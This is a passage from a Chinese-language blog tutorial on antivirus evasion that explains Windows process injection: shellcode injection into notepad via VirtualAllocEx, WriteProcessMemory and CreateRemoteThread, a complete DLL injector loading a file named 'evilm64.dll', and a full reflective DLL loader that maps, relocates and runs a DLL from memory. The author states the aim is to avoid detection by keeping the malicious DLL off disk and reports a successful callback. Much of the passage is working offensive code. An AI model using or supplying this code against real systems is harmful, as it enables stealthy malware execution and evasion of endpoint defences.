<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LPVOID VirtualAllocEx(</span><br><span class="line">  HANDLE hProcess,&#x2F;&#x2F;我们想要分配内存的进程</span><br><span class="line">  LPVOID lpAddress,&#x2F;&#x2F;受害者进程内存中指定地址的指针</span><br><span class="line">  SIZE_T dwSize,&#x2F;&#x2F;分配的内存区域的大小</span><br><span class="line">  DWORD  flAllocationType,&#x2F;&#x2F;指定要分配的内存类型</span><br><span class="line">  DWORD  flProtect&#x2F;&#x2F;它指定分配的内存保护,我们将其设置为PAGE_EXECUTE_READWRITE。</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>​    通过执行VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE)，我们可以在processHandle指向的进程中分配一块内存，并且设置内存为可执行权限，当函数执行成功，则返回分配内存的首地址，不成功则返回null。当我们执行完内存分配后remoteBuffer中会有一个地址，但是这个地址并不是我们当前进程的地址，而是notepad的地址。</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110105814469.png" alt="image-20201110105814469"></p>
<p>​    我们使用hxd来查看这个地址的内容</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110105919797.png" alt="image-20201110105919797"></p>
<p><strong>WriteProcessMemory</strong></p>
<p>​    <code>WriteProcessMemory</code>是一个将数据写入指定进程的内存区域的函数。需要注意的是整个内存区域必须是可写的，否则会失败。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BOOL WriteProcessMemory(</span><br><span class="line">      HANDLE  hProcess,&#x2F;&#x2F;我们想要写入数据的进程</span><br><span class="line">  LPVOID  lpBaseAddress,&#x2F;&#x2F;我们想要写入数据的地址</span><br><span class="line">  LPCVOID lpBuffer,&#x2F;&#x2F;指向必须写入的数据的指针</span><br><span class="line">  SIZE_T  nSize,&#x2F;&#x2F;写入的数据量</span><br><span class="line">  SIZE_T  *lpNumberOfBytesWritten&#x2F;&#x2F;指向SIZE_T的指针，它将存储写入该目标的字节数。</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>​    按照上面的理解，当我们执行完WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL)后，会在processHandle进程中开辟的空间remoteBuffer中写入大小为sizeof shellcode,内容为shellcode的数据。调用后成功将shellcode写入到notepad的内存中</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110110155310.png" alt="image-20201110110155310"></p>
<p><strong>CreateRemoteThread</strong></p>
<p>​    CreateRemoteThread在另一个进程的虚拟空间中创建一个线程。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HANDLE CreateRemoteThread(</span><br><span class="line">  HANDLE                 hProcess,&#x2F;&#x2F; 目标进程句柄</span><br><span class="line">  LPSECURITY_ATTRIBUTES  lpThreadAttributes,&#x2F;&#x2F; 安全属性</span><br><span class="line">  SIZE_T                 dwStackSize, &#x2F;&#x2F; 进程堆栈大小</span><br><span class="line">  LPTHREAD_START_ROUTINE lpStartAddress,  &#x2F;&#x2F; 进程函数</span><br><span class="line">  LPVOID                 lpParameter, &#x2F;&#x2F; 进程参数</span><br><span class="line">  DWORD                  dwCreationFlags, &#x2F;&#x2F; 创建标志</span><br><span class="line">  LPDWORD                lpThreadId &#x2F;&#x2F; 参数返回ID</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>​    当执行下面的操作时，则会执行remoteBuffer指向的内容。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);</span><br></pre></td></tr></table></figure>

<p>​    最后调用CreateRemoteThread,成功上线，但是这里有一个问题，因为我们现在使用windows创建的notepad为64位，所以我们要编译的这个exe也应该是64位，否则调用CreateRemoteThread会返回0调用失败。</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110110250322.png" alt="image-20201110110250322"></p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110110331437.png" alt="image-20201110110331437"></p>
<h2 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h2><p>​    首先给出DLL注入的代码，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc, char* argv[]) &#123;</span><br><span class="line">	HANDLE processHandle;</span><br><span class="line">	PVOID remoteBuffer;</span><br><span class="line">	wchar_t dllPath[] &#x3D; TEXT(&quot;C:\\experiments\\evilm64.dll&quot;);</span><br><span class="line"></span><br><span class="line">	printf(&quot;Injecting DLL to PID: %i\n&quot;, atoi(argv[1]));</span><br><span class="line">	processHandle &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));</span><br><span class="line">	remoteBuffer &#x3D; VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);</span><br><span class="line">	PTHREAD_START_ROUTINE threatStartRoutineAddress &#x3D; (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT(&quot;Kernel32&quot;)), &quot;LoadLibraryW&quot;);</span><br><span class="line">	CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);</span><br><span class="line">	CloseHandle(processHandle);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    通过查看上面的代码，我们可以看出上面的代码和远程线程调用的代码类似，不同的是将shellcode数组的地址转换为dll的路径。还有就是调用了GetProcAddress这个函数，我们先了解一下这个函数。</p>
<p><strong>GetProcAddress</strong></p>
<p>​    GetProcAddress是一个计算机函数，功能是检索指定的动态链接库(DLL)中的输出<a href="https://baike.baidu.com/item/库函数/3471322" target="_blank" rel="noopener">库函数</a>地址。lpProcName参数能够识别DLL中的函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FARPROC GetProcAddress(</span><br><span class="line">HMODULE hModule, &#x2F;&#x2F; DLL模块句柄</span><br><span class="line">LPCSTR lpProcName &#x2F;&#x2F; 函数名</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>​    然后我们再来理解一下GetProcAddress(GetModuleHandle(TEXT(“Kernel32”)), “LoadLibraryW”);也就是获取LoadLibraryW函数的地址，LoadLibraryW函数的功能可以加载指定路径的DLL文件。之所以没有直接调用LoadLibraryW函数，是因为这个函数不能直接调用，只能查找这个函数名称所在的内存地址进行调用。</p>
<p>​    所以使用DLL注入的过程大概是这样的</p>
<ul>
<li><p>OpenProcess 找到我们想要注入进程的句柄，获取权限</p>
</li>
<li><p>VirtualAllocEx 分配内存，用来存放我们DLL的路径</p>
</li>
<li><p>WriteProcessMemory 将DLL的路径写入分配的内存</p>
</li>
<li><p>GetProcAddress 获取LoadLibraryW这个库函数的地址</p>
</li>
<li><p>CreateRemoteThread 使用LoadLibraryW加载DLL执行</p>
<p>我们调试一下，看和我们分析的结果是否相同，首先在执行完VirtualAllocEx 会分配一块内存</p>
</li>
</ul>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110151824300.png" alt="image-20201110151824300"></p>
<p>​    我们使用HXD找到这块内存，看是否分配成功，如下所示：</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110151807657.png" alt="image-20201110151807657"></p>
<p>​    再继续执行，WriteProcessMemory函数执行后，会再该内存写入我们DLL的地址</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110151957686.png" alt="image-20201110151957686"></p>
<p>​    最后，当我们调用CreateRemoteThread后，成功上线。</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110152028142.png" alt="image-20201110152028142"></p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110152054110.png" alt="image-20201110152054110"></p>
<h2 id="反射DLL注入"><a href="#反射DLL注入" class="headerlink" title="反射DLL注入"></a>反射DLL注入</h2><p>​    上面我们演示的DLL注入技术有一个很明显的缺陷，那就是必须让我们的DLL在目标的硬盘上，直接将我们恶意的DLL放到硬盘中，无疑加大了被查杀的风险，因此下来我们来了解一下不落地执行DLL的方法，那就是反射DLL注入技术，它允许我们从内存中向受害者进程注入DLL。</p>
<p>​    我们先看一下简单的反射DLL的栗子，首先使用vs创建一个DLL项目，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">BOOL APIENTRY DllMain(HMODULE hModule,</span><br><span class="line">    DWORD  ul_reason_for_call,</span><br><span class="line">    LPVOID lpReserved</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">    &#123;</span><br><span class="line">        MessageBoxA(NULL, &quot;注入成功!&quot;, &quot;提示&quot;, MB_OK);</span><br><span class="line">    &#125;</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    上面的代码内容比较简单，当调用这个DLL时，会弹出一个框提示注入成功，重点在下面的代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">typedef struct BASE_RELOCATION_BLOCK &#123;</span><br><span class="line">	DWORD PageAddress;</span><br><span class="line">	DWORD BlockSize;</span><br><span class="line">&#125; BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;</span><br><span class="line"></span><br><span class="line">typedef struct BASE_RELOCATION_ENTRY &#123;</span><br><span class="line">	USHORT Offset : 12;</span><br><span class="line">	USHORT Type : 4;</span><br><span class="line">&#125; BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;</span><br><span class="line"></span><br><span class="line">using DLLEntry &#x3D; BOOL(WINAPI*)(HINSTANCE dll, DWORD reason, LPVOID reserved);</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	&#x2F;&#x2F; get this module&#39;s image base address</span><br><span class="line">	PVOID imageBase &#x3D; GetModuleHandleA(NULL);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; load DLL into memory</span><br><span class="line">	HANDLE dll &#x3D; CreateFileA(&quot;\\\\VBOXSVR\\Experiments\\MLLoader\\MLLoader\\x64\\Debug\\dll.dll&quot;, GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);</span><br><span class="line">	DWORD64 dllSize &#x3D; GetFileSize(dll, NULL);</span><br><span class="line">	LPVOID dllBytes &#x3D; HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllSize);</span><br><span class="line">	DWORD outSize &#x3D; 0;</span><br><span class="line">	ReadFile(dll, dllBytes, dllSize, &amp;outSize, NULL);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; get pointers to in-memory DLL headers</span><br><span class="line">	PIMAGE_DOS_HEADER dosHeaders &#x3D; (PIMAGE_DOS_HEADER)dllBytes;</span><br><span class="line">	PIMAGE_NT_HEADERS ntHeaders &#x3D; (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBytes + dosHeaders-&gt;e_lfanew);</span><br><span class="line">	SIZE_T dllImageSize &#x3D; ntHeaders-&gt;OptionalHeader.SizeOfImage;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; allocate new memory space for the DLL. Try to allocate memory in the image&#39;s preferred base address, but don&#39;t stress if the memory is allocated elsewhere</span><br><span class="line">	&#x2F;&#x2F;LPVOID dllBase &#x3D; VirtualAlloc((LPVOID)0x000000191000000, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	LPVOID dllBase &#x3D; VirtualAlloc((LPVOID)ntHeaders-&gt;OptionalHeader.ImageBase, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; get delta between this module&#39;s image base and the DLL that was read into memory</span><br><span class="line">	DWORD_PTR deltaImageBase &#x3D; (DWORD_PTR)dllBase - (DWORD_PTR)ntHeaders-&gt;OptionalHeader.ImageBase;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; copy over DLL image headers to the newly allocated space for the DLL</span><br><span class="line">	std::memcpy(dllBase, dllBytes, ntHeaders-&gt;OptionalHeader.SizeOfHeaders);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; copy over DLL image sections to the newly allocated space for the DLL</span><br><span class="line">	PIMAGE_SECTION_HEADER section &#x3D; IMAGE_FIRST_SECTION(ntHeaders);</span><br><span class="line">	for (size_t i &#x3D; 0; i &lt; ntHeaders-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		LPVOID sectionDestination &#x3D; (LPVOID)((DWORD_PTR)dllBase + (DWORD_PTR)section-&gt;VirtualAddress);</span><br><span class="line">		LPVOID sectionBytes &#x3D; (LPVOID)((DWORD_PTR)dllBytes + (DWORD_PTR)section-&gt;PointerToRawData);</span><br><span class="line">		std::memcpy(sectionDestination, sectionBytes, section-&gt;SizeOfRawData);</span><br><span class="line">		section++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; perform image base relocations</span><br><span class="line">	IMAGE_DATA_DIRECTORY relocations &#x3D; ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];</span><br><span class="line">	DWORD_PTR relocationTable &#x3D; relocations.VirtualAddress + (DWORD_PTR)dllBase;</span><br><span class="line">	DWORD relocationsProcessed &#x3D; 0;</span><br><span class="line"></span><br><span class="line">	while (relocationsProcessed &lt; relocations.Size)</span><br><span class="line">	&#123;</span><br><span class="line">		PBASE_RELOCATION_BLOCK relocationBlock &#x3D; (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);</span><br><span class="line">		relocationsProcessed +&#x3D; sizeof(BASE_RELOCATION_BLOCK);</span><br><span class="line">		DWORD relocationsCount &#x3D; (relocationBlock-&gt;BlockSize - sizeof(BASE_RELOCATION_BLOCK)) &#x2F; sizeof(BASE_RELOCATION_ENTRY);</span><br><span class="line">		PBASE_RELOCATION_ENTRY relocationEntries &#x3D; (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);</span><br><span class="line"></span><br><span class="line">		for (DWORD i &#x3D; 0; i &lt; relocationsCount; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			relocationsProcessed +&#x3D; sizeof(BASE_RELOCATION_ENTRY);</span><br><span class="line"></span><br><span class="line">			if (relocationEntries[i].Type &#x3D;&#x3D; 0)</span><br><span class="line">			&#123;</span><br><span class="line">				continue;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			DWORD_PTR relocationRVA &#x3D; relocationBlock-&gt;PageAddress + relocationEntries[i].Offset;</span><br><span class="line">			DWORD_PTR addressToPatch &#x3D; 0;</span><br><span class="line">			ReadProcessMemory(GetCurrentProcess(), (LPCVOID)((DWORD_PTR)dllBase + relocationRVA), &amp;addressToPatch, sizeof(DWORD_PTR), NULL);</span><br><span class="line">			addressToPatch +&#x3D; deltaImageBase;</span><br><span class="line">			std::memcpy((PVOID)((DWORD_PTR)dllBase + relocationRVA), &amp;addressToPatch, sizeof(DWORD_PTR));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; resolve import address table</span><br><span class="line">	PIMAGE_IMPORT_DESCRIPTOR importDescriptor &#x3D; NULL;</span><br><span class="line">	IMAGE_DATA_DIRECTORY importsDirectory &#x3D; ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];</span><br><span class="line">	importDescriptor &#x3D; (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)dllBase);</span><br><span class="line">	LPCSTR libraryName &#x3D; &quot;&quot;;</span><br><span class="line">	HMODULE library &#x3D; NULL;</span><br><span class="line"></span><br><span class="line">	while (importDescriptor-&gt;Name !&#x3D; NULL)</span><br><span class="line">	&#123;</span><br><span class="line">		libraryName &#x3D; (LPCSTR)importDescriptor-&gt;Name + (DWORD_PTR)dllBase;</span><br><span class="line">		library &#x3D; LoadLibraryA(libraryName);</span><br><span class="line"></span><br><span class="line">		if (library)</span><br><span class="line">		&#123;</span><br><span class="line">			PIMAGE_THUNK_DATA thunk &#x3D; NULL;</span><br><span class="line">			thunk &#x3D; (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + importDescriptor-&gt;FirstThunk);</span><br><span class="line"></span><br><span class="line">			while (thunk-&gt;u1.AddressOfData !&#x3D; NULL)</span><br><span class="line">			&#123;</span><br><span class="line">				if (IMAGE_SNAP_BY_ORDINAL(thunk-&gt;u1.Ordinal))</span><br><span class="line">				&#123;</span><br><span class="line">					LPCSTR functionOrdinal &#x3D; (LPCSTR)IMAGE_ORDINAL(thunk-&gt;u1.Ordinal);</span><br><span class="line">					thunk-&gt;u1.Function &#x3D; (DWORD_PTR)GetProcAddress(library, functionOrdinal);</span><br><span class="line">				&#125;</span><br><span class="line">				else</span><br><span class="line">				&#123;</span><br><span class="line">					PIMAGE_IMPORT_BY_NAME functionName &#x3D; (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dllBase + thunk-&gt;u1.AddressOfData);</span><br><span class="line">					DWORD_PTR functionAddress &#x3D; (DWORD_PTR)GetProcAddress(library, functionName-&gt;Name);</span><br><span class="line">					thunk-&gt;u1.Function &#x3D; functionAddress;</span><br><span class="line">				&#125;</span><br><span class="line">				++thunk;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		importDescriptor++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; execute the loaded DLL</span><br><span class="line">	DLLEntry DllEntry &#x3D; (DLLEntry)((DWORD_PTR)dllBase + ntHeaders-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">	(*DllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, 0);</span><br><span class="line"></span><br><span class="line">	CloseHandle(dll);</span><br><span class="line">	HeapFree(GetProcessHeap(), 0, dllBytes);</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    我们先看一下执行的结果把，如下所示：</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110173735378.png" alt="image-20201110173735378"></p>
<p>​    也就是通过上面的代码，可以加载并运行我们的dll，了解了这个我们再来看一下代码实现的逻辑。</p>
<p>​    首先，通过下面的代码声明两个结构体，并且声明了一个函数指针</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">typedef struct BASE_RELOCATION_BLOCK &#123;</span><br><span class="line">	DWORD PageAddress;</span><br><span class="line">	DWORD BlockSize;</span><br><span class="line">&#125; BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;</span><br><span class="line"></span><br><span class="line">typedef struct BASE_RELOCATION_ENTRY &#123;</span><br><span class="line">	USHORT Offset : 12;</span><br><span class="line">	USHORT Type : 4;</span><br><span class="line">&#125; BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;</span><br><span class="line"></span><br><span class="line">using DLLEntry &#x3D; BOOL(WINAPI*)(HINSTANCE dll, DWORD reason, LPVOID reserved);</span><br></pre></td></tr></table></figure>

<p>​    下面使用 GetModuleHandleA(NULL)来返回进程的地址空间中的可执行文件的基地址，使用GetFileSize打开我们要加载的DLL文件，再调用在堆上分配大小为dllsize的内存空间，通过ReadFile将DLL文件中的内容写入到刚分配的堆地址空间中。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PVOID imageBase &#x3D; GetModuleHandleA(NULL);</span><br><span class="line">	HANDLE dll &#x3D; CreateFileA(&quot;C:\\Users\\admin\\source\\repos\\testDLl\\Debug\\testDLl.dll&quot;, GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);</span><br><span class="line">	DWORD64 dllSize &#x3D; GetFileSize(dll, NULL);</span><br><span class="line">	LPVOID dllBytes &#x3D; HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllSize);</span><br><span class="line">	DWORD outSize &#x3D; 0;</span><br><span class="line">	ReadFile(dll, dllBytes, dllSize, &amp;outSize, NULL);</span><br></pre></td></tr></table></figure>

<p>​    我们调试一下这个程序，可以看到当运行完ReadFile后，确实将DLL的内容复制到了dllBytes指向的内存中。</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110175404600.png" alt="image-20201110175404600"></p>
<p>​    好了，我们再看一下后面的代码，首先获取dosheaders，再通过dllbytes首地址+dosheaders-&gt;e_lfanew的值相加，得到pe头的地址。再通过取出OptionalHeader.SizeOfImage属性获取映像加载到内存后的大小    。</p>
<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201111095440475.png" alt="image-20201111095440475"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PIMAGE_DOS_HEADER dosHeaders &#x3D; (PIMAGE_DOS_HEADER)dllBytes; </span><br><span class="line">PIMAGE_NT_HEADERS ntHeaders &#x3D; (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBytes + dosHeaders-&gt;e_lfanew);</span><br><span class="line">SIZE_T dllImageSize &#x3D; ntHeaders-&gt;OptionalHeader.SizeOfImage;</span><br></pre></td></tr></table></figure>

<p>​        再使用VirtualAlloc分配一块基址为ntHeaders-&gt;OptionalHeader.ImageBase，大小为dllImageSize的内存，并且更改内存为可读写执行权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LPVOID dllBase &#x3D; VirtualAlloc((LPVOID)ntHeaders-&gt;OptionalHeader.ImageBase, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br></pre></td></tr></table></figure>

<p>​    获取我们预期分配地址和实际分配地址的差值，并且将文件头部复制到分配的内存中。</p>
